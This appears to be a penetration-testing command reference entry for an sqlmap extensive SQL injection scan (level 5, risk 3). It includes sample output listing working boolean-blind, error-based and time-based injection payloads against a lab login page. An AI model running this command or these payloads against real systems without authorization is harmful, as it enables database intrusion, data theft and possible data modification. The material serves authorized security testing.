---
id: 38749ef2-cc64-4662-b449-27bda74cbe6c
name: sqlmap-extensive-injection-scan
type: command
executor: bash
data: sqlmap -u '$_TARGET_URL' --data='$_POST_DATA' --level=5 --risk=3
output: >2
          ___
         __H__
   ___ ___[,]_____ ___ ___  {1.2.7#stable}
  |_ -| . [.]     | .'| . |

  |___|_  [)]_|_|_|__,|  _|
        |_|V          |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior
  mutual consent is illegal. It is the end user's responsibility to obey all
  applicable local, state and federal laws. Developers assume no liability and
  are not responsible for any misuse or damage caused by this program


  [*] starting at 21:34:15


  [21:34:16] [INFO] resuming back-end DBMS 'mysql' 

  [21:34:16] [INFO] testing connection to the target URL

  sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you
  want to follow? [Y/n] y

  redirect is a result of a POST request. Do you want to resend original POST
  data to a new location? [Y/n] y

  sqlmap resumed the following injection point(s) from stored session:

  ---

  Parameter: user (POST)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: user=demo@vcart.com' AND 4501=4501 AND 'FDuX'='FDuX&pass=demo&selop=2

      Type: error-based
      Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: user=demo@vcart.com' AND (SELECT 2109 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(2109=2109,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CniM'='CniM&pass=demo&selop=2

      Type: AND/OR time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind
      Payload: user=demo@vcart.com' AND SLEEP(5) AND 'ZNQd'='ZNQd&pass=demo&selop=2

  Parameter: pass (POST)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: user=demo@vcart.com&pass=demo' AND 2948=2948 AND 'YLTi'='YLTi&selop=2

      Type: error-based
      Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: user=demo@vcart.com&pass=demo' AND (SELECT 9195 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(9195=9195,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'inPR'='inPR&selop=2

      Type: AND/OR time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind
      Payload: user=demo@vcart.com&pass=demo' AND SLEEP(5) AND 'QOIf'='QOIf&selop=2
  ---

  there were multiple injection points, please select the one to use for
  following injections:

  [0] place: POST, parameter: pass, type: Single quoted string (default)

  [1] place: POST, parameter: user, type: Single quoted string

  [q] Quit

  > 0

  [21:34:27] [INFO] the back-end DBMS is MySQL

  web application technology: Apache 2.4.41, PHP 7.1.32

  back-end DBMS: MySQL >= 5.0

  [21:34:27] [INFO] fetched data logged to text files under
  '/root/.sqlmap/output/192.168.1.10'


  [*] shutting down at 21:34:27
created_at: '2020-09-02T18:08:36.743522+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Web
tags:
  - sqli
  - sqlmap
verified: true
validated: true
---

# sqlmap-extensive-injection-scan

## Command

```bash
sqlmap -u '$_TARGET_URL' --data='$_POST_DATA' --level=5 --risk=3
```

## Description

This command runs SQLMap to perform an extensive scan for SQL injection vulnerabilities in a web application's POST parameters, using the highest testing level (5) and risk (3) to cover all potential injection points including headers, cookies, and aggressive payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u '$_TARGET_URL' | The target URL to test for injection (e.g., http://example.com/login.php) | Yes |
| --data='$_POST_DATA' | POST data to include in the request (e.g., 'user=test&pass=test') | Yes |
| --level=5 | Testing level from 1-5; 5 tests all vectors (parameters, headers, cookies) | No (default 1) |
| --risk=3 | Risk level from 1-3; 3 includes payloads that may modify the database | No (default 1) |

## Examples

### Basic Usage

```bash
sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo&pass=demo' --level=5 --risk=3
```

### Advanced Usage

```bash
sqlmap -u 'http://target.com/search.php' --data='query=$_QUERY' --level=5 --risk=3 --batch --dbms=mysql
```

## Expected Output

SQLMap displays its banner, resumes any prior session, tests the connection, identifies injection points (e.g., boolean-based blind on parameters), fingerprints the DBMS (e.g., MySQL), and logs results to ~/.sqlmap/output/. User prompts may appear for redirects or point selection. Successful output includes confirmed vulnerabilities and web technologies detected.

## Related

- [[procedures/Perform-SQL-Injection-Detection-and-Exploitation-Using-SQLMap-Extensive-Options]]
- [[tools/sqlmap]]
